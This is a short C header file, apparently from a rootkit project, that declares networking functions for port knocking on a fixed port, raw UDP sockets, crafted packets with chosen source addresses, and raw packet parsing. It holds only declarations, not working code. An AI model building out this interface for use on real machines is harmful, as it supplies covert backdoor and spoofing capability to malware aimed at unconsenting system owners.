#ifndef ROOTKIT_NETWORKING_H
#define ROOTKIT_NETWORKING_H

#define KNOCK_DEST_PORT 30
#include <stdint.h>
#include <stdio.h>


void initiate_port_knock();
int create_raw_udp_socket();
int bind_raw_socket(int socket_fd, char * ip_address);
void create_packet(int socket_fd, const char * source_ip, const char * dest_ip, int source_port, int dest_port);
uint16_t parse_raw_packet(const char * buffer, ssize_t n);
char * get_local_interface_name();


#endif //ROOTKIT_NETWORKING_H